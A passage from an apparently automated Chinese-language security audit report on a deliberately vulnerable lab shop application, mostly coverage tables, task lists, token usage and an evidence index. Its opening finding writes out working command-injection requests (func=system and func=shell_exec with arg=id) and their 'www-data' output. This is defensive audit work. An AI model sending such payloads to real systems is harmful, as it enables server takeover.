  - 复核观测：正常侧 作业 8f0a560d96ec43f5bb51709d47e446ec（operator，GET /ops/formula.php?func=strtoupper&arg=spring-sale）返回 200，页面 <pre>SPRING-SALE</pre>，与预期字符串函数的正常试算结果一致，说明该功能在 operator 会话中可用且结果回显在 <pre> 中。对照作业 01727b451f5448f28dcffc8f0fa87a36（alice，同 URL）返回 403 与“当前账号没有访问该功能的权限。”，说明 operator/admin 角色校验确实生效。；攻击侧 作业 fad4a899868e4cb5b24ebb4a00eccc94（operator，GET /ops/formula.php?func=system&arg=id）返回 200，响应正文开头即为 "uid=33(www-data) gid=33(www-data) groups=33(www-data)"，且 <pre> 中回显同样内容，证明 func 参数被当作真实函数名执行、arg 被作为 system 的命令串执行。作业 eff3957497b84f63a11c84400ce65348（operator，func=shell_exec&arg=id）同样在 <pre> 中回显 "uid=33(www-data) gid=33(www-data) groups=33(www-data)\n"，构成第二类危险函数可调用的独立观测。两次均为 operator 会话实际提交，非管理员会…

## 6. 覆盖与未决项

| 独立分母 | 总数 | 已结算 | 未决/待办 | 闭环 |
|---|---:|---:|---:|---|
| 文件覆盖 | 61 | 读取 61；读取+跳过 61 | 0 | 是 |
| 必做方向 | 78 | 已决 78；跳过 0 | 0 | 是 |
| 动态验证 | 31 | 已验证 31；已复核记录 31 | 待验证 0；待复核 0 | — |
| 正式终审 | 31 | 已接受 31 | 待终审 0；存疑 0 | — |

**限制**

- 受阻、未执行、未读取的方向均不代表安全。

## 7. 附录与证据索引

**撤回、重复或替代记录**

- `cc722324fcae40d7b8c5a259e1314fff`（revision 1）：duplicate——订单详情仅按请求 id 查询，任意登录用户可读取他人订单
- `ab9dae2a78c747ca9f04f2e5e5540027`（revision 1）：duplicate——ops/users.php 用客户端 Cookie role 决定管理员判定，普通登录用户可越权读取全部用户
- `735a4817c0174afea654205174aaaa97`（revision 1）：duplicate——ops/members.php 查询参数 q 经 member_lookup 拼接进 SQL 造成注入

**任务记录**

| 任务 | 标题 | 状态 | 错误 |
|---|---|---|---|
| `c375c25626374a48a35bee51acb5a3fe` | 认证与公共防护 | completed | — |
| `22746587871d4778a7726a8a310a3d31` | 逐项收尾：auth | completed | — |
| `3dbe39fc24c545f6b20037a62de8c7ee` | 逐项收尾：account | completed | — |
| `aac9074c4e6c4320abe8799606e9361f` | 运维命令与鉴权 | completed | — |
| `0395d5f001924131a8f9fdb510db9e6b` | 逐项收尾：infrastructure | completed | — |
| `58e4929004a54cd6a5823c40a3365769` | 运维数据查询 | completed | — |
| `14d193a3f309438fa2b43d94baddbdc4` | 逐项收尾：content | completed | — |
| `ad2c3e66a74f43338c33d72071e95502` | 外部访问与凭据链 | completed | — |
| `2253d9b010af41b1b73470d2466767ca` | 逐项收尾：ops | completed | — |
| `5414d0a346e346c8b1fa2b762d26f026` | 补齐 6 个未读第一方源码文件的入口与敏感操作核对 | completed | — |
| `73832c934c824285bb5427bfd916900d` | 备份/作业反序列化链 | completed | — |
| `bde9a1c66d5d45f3b00f57cc20618bb8` | 部署初始化 | completed | — |
| `6ed74249b833415a98af6bc6a5520ae2` | 逐项收尾：commerce | completed | — |
| `48d1cb4333ec46388745b42e10b036c6` | 其它入口覆盖 | completed | — |
| `95b28cdf1a4c4542b5c26427ed05cad4` | 账户字段和备份 | completed | — |
| `d479f53180374a7e911e361a1f719dcf` | 对象唤醒调用链 | completed | — |
| `1c6e77ac3d8645fd97e9f5744db16006` | 运维鉴权矩阵 | completed | — |
| `7daa86a3cb7d44c589756ea080c2f02e` | bootstrap 公共层与 SQL/输出编码追踪 | completed | — |
| `9dbc94d54e614d8e8246d9fbc051158b` | 运维维护入口：命令执行与文件操作边界 | completed | — |
| `201d7ae2dc6e4dd094e6c9c03afde1ae` | 订单创建到结算的金额篡改与对象归属 | completed | — |
| `cef34bd217004a58b065318e0f12faaa` | 订单创建价格篡改与结算一致性 | completed | — |
| `e4f228f1832c4ee3bfa1c8f563f97628` | catalog/index.php 第 4 行查询拼接的来源与防护核查 | completed | — |
| `8cbda0ae13a54f3a91ebb55cdc5f6fe0` | catalog/index.php 查询参数 SQL 注入义务核对 | completed | — |
| `913c8c3d9e534102aab139552e10523d` | 认证登录/会话固定链补读（login.php 与 continue.php） | completed | — |
| `44a67fcc32944e1badd3d385cc825f35` | 运营后台基于客户端 Cookie 的权限判定 | completed | — |
| `42c15405e05d4f2cba44b64b24131e06` | 订单详情与创建的归属校验与参数处理 | completed | — |
| `71346f3b0c3f4fa0abe9b9c9003cc09f` | 账户模块鉴权与会话/对象访问控制 | completed | — |
| `e491c0fdcea5414c9e3917d739c91414` | 支持文档下载路径穿越与文件读取范围 | completed | — |
| `e5c9bd7e04414de7918b280db09e83e4` | 提现余额校验与原子扣减窄查 | completed | — |
| `1d773e8982bf497b95c97b481e1c27dd` | 目录页查询构造的 SQL 注入面 | completed | — |
| `ec3ee35093b648688e3eae131ff9e2fe` | 注册口令哈希与账号创建的存储安全面 | completed | — |
| `a6e92500bc444f32b866fae056b8057f` | 注册入口的 CSRF、口令哈希与用户可控字段 | completed | — |
| `60f5a3809c9b47b99194f040381e5a2f` | 目录页查询构造与注入面 | completed | — |
| `accfbd2ac07c4ef39246706e59428480` | 注册入口的CSRF状态变更与口令哈希 | completed | — |
| `c469958ac7c640f38b633c9c81d17ea0` | 钱包与订单结算路径的只读复核（窄范围） | completed | — |
| `e4c43d2404b44c14b1ad7d2bfb4099ca` | catalog/index.php 查询拼接与 SQL 注入义务 | completed | — |
| `645e543140754991ae6dc9d956b9f49c` | 钱包扣减与订单结算链（缩小范围） | completed | — |
| `8b80386ac7f04b6fab731d916aafa593` | 商品详情、问候与内容页的用户可控输出编码 | completed | — |
| `8f0c631134a346edbe3c7c2271f160ea` | 调度脚本与公共入口逐行检查 | completed | — |
| `f0116bdb94da455a8e0248cd9b408c20` | 支持中心下载路径与消息输出面 | completed | — |

### API 提示缓存

- 输入 token 命中率：52.00%；命中 2643072 tokens / 已报告缓存的输入 5082570 tokens。
- 数据覆盖：204/204 条用量记录；缓存写入 0 tokens。
- 命中率按供应商返回的 token 加权；未报告不按零命中处理。SDK 每阶段汇总记一条，其余每次响应记一条。提示缓存仍消耗模型请求额度；本项不包含工具缓存，也不估算未配置的费用。

- 用量：上限 响应 284；工具 5075；秒 10110；实际 响应 276；工具 234；秒 6497.901；剩余 响应 8；工具 4841；秒 3612.099

**证据索引（服务器读取）**

| evidence_id | 路径 | 范围 | 文件哈希 | 可用 |
|---|---|---|---|---|
| `99c262dc45d98b87` | lab30-shop/app/public/partner/portal.php | 2-2 | `e1267edb0f9df936` | 是 |
| `a886b187732cd22c` | lab30-shop/app/public/partner/portal.php | 3-3 | `e1267edb0f9df936` | 是 |
| `1e27ea27920ba4b2` | lab30-shop/app/public/partner/portal.php | 4-4 | `e1267edb0f9df936` | 是 |
| `a38e3c88da1d79cc` | lab30-shop/app/public/partner/portal.php | 5-5 | `e1267edb0f9df936` | 是 |
| `ab54a1f06e186428` | lab30-shop/app/public/partner/token.php | 4-4 | `391948b46efce76c` | 是 |
| `6c092feeb2c2840e` | lab30-shop/app/public/ops/maintenance.php | 2-5 | `b96aecd7df7c5fa4` | 是 |
| `78224482780bf94a` | lab30-shop/app/src/bootstrap.php | 33-37 | `2050819d093be02b` | 是 |
| `17e5f04f686928da` | lab30-shop/app/public/ops/database.php | 2-4 | `be196ddf57212663` | 是 |
| `bd2a787730066498` | lab30-shop/app/src/bootstrap.php | 4-7 | `2050819d093be02b` | 是 |
| `10c0c8123072e718` | lab30-shop/app/public/support/download.php | 2-3 | `71f0558eeb4ebb6c` | 是 |
| `f5faf41dff9a5a91` | lab30-shop/app/src/bootstrap.php | 9-9 | `2050819d093be02b` | 是 |
| `458ca1b11ccc7039` | lab30-shop/app/src/setup.php | 31-36 | `53e7dc7286d7d370` | 是 |
| `cf8341b8a8bbe3d7` | lab30-shop/compose.yaml | 40-44 | `4019766f612dc6a0` | 是 |
| `2ba1a6f9578aa5c7` | lab30-shop/app/public/support/messages.php | 2-5 | `a6866f07b4de32f3` | 是 |
| `5220b9ce518719f6` | lab30-shop/app/src/bootstrap.php | 10-10 | `2050819d093be02b` | 是 |
| `c57a3bf6bb6b01db` | lab30-shop/app/public/catalog/greeting.php | 2-3 | `8e6db315fdfc32cf` | 是 |
| `667c91ac7c21aa66` | lab30-shop/app/public/ops/report.php | 2-3 | `90d7d60d44815374` | 是 |
| `ec18381d7af73d0f` | lab30-shop/app/public/account/update.php | 4-6 | `b8227f19c05d0cd3` | 是 |
| `6220461f4c36cb1a` | lab30-shop/app/src/bootstrap.php | 33-36 | `2050819d093be02b` | 是 |
| `d0a2bdabe3fc2799` | lab30-shop/app/public/wallet/withdraw.php | 2-2 | `e3e73271e379b085` | 是 |
| `a044780447d4b470` | lab30-shop/app/public/wallet/withdraw.php | 4-5 | `e3e73271e379b085` | 是 |
| `b18e822d79b81e94` | lab30-shop/app/public/wallet/withdraw.php | 6-6 | `e3e73271e379b085` | 是 |
| `5236e46f3074f56b` | lab30-shop/app/public/wallet/withdraw.php | 7-8 | `e3e73271e379b085` | 是 |
| `a41ee4811beeaf1b` | lab30-shop/app/public/ops/batch-check.php | 1-3 | `5f76332e7ad1b33a` | 是 |
| `65fc5323ae7c9b98` | lab30-shop/app/src/host_check.php | 1-2 | `c3a868155c2d335e` | 是 |
| `508acdd24002c0f9` | lab30-shop/app/public/orders/detail.php | 2-2 | `be69aa78cecffcfd` | 是 |
| `11f6d28e3dbb78f6` | lab30-shop/app/public/orders/detail.php | 3-3 | `be69aa78cecffcfd` | 是 |
| `8b236e783043021b` | lab30-shop/app/public/orders/detail.php | 4-4 | `be69aa78cecffcfd` | 是 |
| `490c7d72eb514d6b` | lab30-shop/app/public/orders/index.php | 2-2 | `633f73e04b427bba` | 是 |
| `97325d351d8189c3` | lab30-shop/app/public/auth/register.php | 7-8 | `99166a0288be7b1e` | 是 |
| `1d3eb2d6e3bdc9fc` | lab30-shop/app/public/auth/login.php | 6-7 | `b9be43ddb2233156` | 是 |
| `a3a2825731fc4c1a` | lab30-shop/app/public/auth/continue.php | 2-4 | `50fde4a15e52af44` | 是 |
| `6d414efca492b76e` | lab30-shop/app/public/orders/create.php | 3-3 | `41e73625d7e04c58` | 是 |
| `bcd0fbadcdc153cd` | lab30-shop/app/public/orders/create.php | 4-4 | `41e73625d7e04c58` | 是 |
| `e2043780068cc449` | lab30-shop/app/public/orders/create.php | 5-5 | `41e73625d7e04c58` | 是 |
| `9e2e81f9a8d2aef6` | lab30-shop/app/public/orders/create.php | 7-7 | `41e73625d7e04c58` | 是 |
| `be43fce581c2c052` | lab30-shop/app/public/content/page.php | 2-3 | `53c5997117f2d54c` | 是 |
| `ede55ccd6753bee7` | lab30-shop/app/src/bootstrap.php | 3-3 | `2050819d093be02b` | 是 |
| `61f200eb89320676` | lab30-shop/app/public/ops/ping.php | 1-3 | `c15517950afe0794` | 是 |
| `9af2d828eb658d25` | lab30-shop/app/public/catalog/index.php | 3-4 | `e85bd1c2fa6a4b78` | 是 |
| `c7992617ff9f7621` | lab30-shop/app/src/bootstrap.php | 4-6 | `2050819d093be02b` | 是 |
| `bc71d05290d8c856` | lab30-shop/app/public/ops/jobs.php | 2-3 | `0f7550fa7f16bd4a` | 是 |
| `4a4dd3de59c1de26` | lab30-shop/app/src/dispatch_job.php | 1-5 | `e8234b971fe75d85` | 是 |
| `368b0f4121e7e402` | lab30-shop/app/public/auth/login.php | 3-3 | `b9be43ddb2233156` | 是 |
| `daf307afc7aa3b5b` | lab30-shop/app/public/auth/login.php | 7-9 | `b9be43ddb2233156` | 是 |
| `96d4fc4a57e8be01` | lab30-shop/app/src/bootstrap.php | 13-18 | `2050819d093be02b` | 是 |
| `12d724d86e16c5f7` | lab30-shop/app/public/ops/members.php | 1-4 | `aef140c3800b9cf1` | 是 |
| `4d2f2da581629f05` | lab30-shop/app/src/member_lookup.php | 1-4 | `eb704332329d4530` | 是 |
| `c7321e7900aae64d` | lab30-shop/app/public/ops/xml-import.php | 2-4 | `3c23a76b1047f734` | 是 |
| `4eba9252f833f919` | lab30-shop/app/src/bootstrap.php | 38-40 | `2050819d093be02b` | 是 |
| `06e77bb1ca712323` | lab30-shop/app/src/bootstrap.php | 16-16 | `2050819d093be02b` | 是 |
| `bd5a7bd685d6990b` | lab30-shop/app/public/account/settings.php | 3-8 | `f54949d62e46b9ca` | 是 |
| `276ee5490bb6c42b` | lab30-shop/app/public/account/settings.php | 5-5 | `f54949d62e46b9ca` | 是 |
| `5d596a817dad3c10` | lab30-shop/app/public/ops/template-preview.php | 1-3 | `107da46e9b067ce0` | 是 |
| `e1dc06d2f03a80eb` | lab30-shop/app/public/account/profile.php | 2-3 | `6f2406bbf636de04` | 是 |
| `1b8b2b99a1a47fee` | lab30-shop/app/src/bootstrap.php | 46-46 | `2050819d093be02b` | 是 |
| `52a7b68bba8b1c1f` | lab30-shop/app/public/account/backup.php | 4-6 | `017e1703cdf0ff0c` | 是 |
| `9d0d13b19a80b9a2` | lab30-shop/app/src/backup.php | 2-5 | `571459cc8b0f6e8e` | 是 |
| `512c66e6f8b9519d` | lab30-shop/app/public/ops/users.php | 2-2 | `3c5e879d945650ba` | 是 |
| `15eb2a96e150221e` | lab30-shop/app/public/ops/users.php | 3-3 | `3c5e879d945650ba` | 是 |
| `e84191827e1714cf` | lab30-shop/app/public/ops/users.php | 4-5 | `3c5e879d945650ba` | 是 |
| `9d62b8b1257e5f2a` | lab30-shop/app/src/bootstrap.php | 20-25 | `2050819d093be02b` | 是 |
| `136d02a92a08ac98` | lab30-shop/app/public/ops/template-render.php | 1-4 | `357da9e9959275d8` | 是 |
| `063c928d2d7c3b2e` | lab30-shop/app/src/bootstrap.php | 33-40 | `2050819d093be02b` | 是 |
| `17e1cacfb5189678` | lab30-shop/app/public/ops/url-preview.php | 2-4 | `e495938b10c455c6` | 是 |
| `e22c7db798ad872d` | lab30-shop/app/public/account/update.php | 2-7 | `b8227f19c05d0cd3` | 是 |
| `5c7a19d86aca3057` | lab30-shop/app/src/bootstrap.php | 20-24 | `2050819d093be02b` | 是 |
| `332e76d0afff47a7` | lab30-shop/app/public/auth/register.php | 4-10 | `99166a0288be7b1e` | 是 |
| `1db409b53daeba5e` | lab30-shop/app/src/bootstrap.php | 13-16 | `2050819d093be02b` | 是 |
| `b48ee34852bb1a8a` | lab30-shop/app/public/account/redeem.php | 4-5 | `28b3dc4534cca985` | 是 |
| `429211e3a8985b43` | lab30-shop/app/public/account/redeem.php | 9-9 | `28b3dc4534cca985` | 是 |
| `415907ec6bf2f739` | lab30-shop/app/src/bootstrap.php | 40-40 | `2050819d093be02b` | 是 |
| `f3b7c0b40a3232d5` | lab30-shop/app/public/ops/formula.php | 1-4 | `686f39f31996a5d3` | 是 |

**附件与机器可读清单**

- Markdown：本报告（由事实包确定性生成）。
- JSON：result.json（含本事实包与质量结果）
- 证据包：evidence/（POC 脚本、runner 产物、runner manifest）
- 源码：源码片段由宿主从冻结快照读取，见 source_evidence
- 事实包 ID：`c23b6cfc1a968df64a06c66ef539d1ebc3ed2778185a0307e18282ff0be1dbcd`；页面、Markdown、JSON 与证据包共用同一份事实。
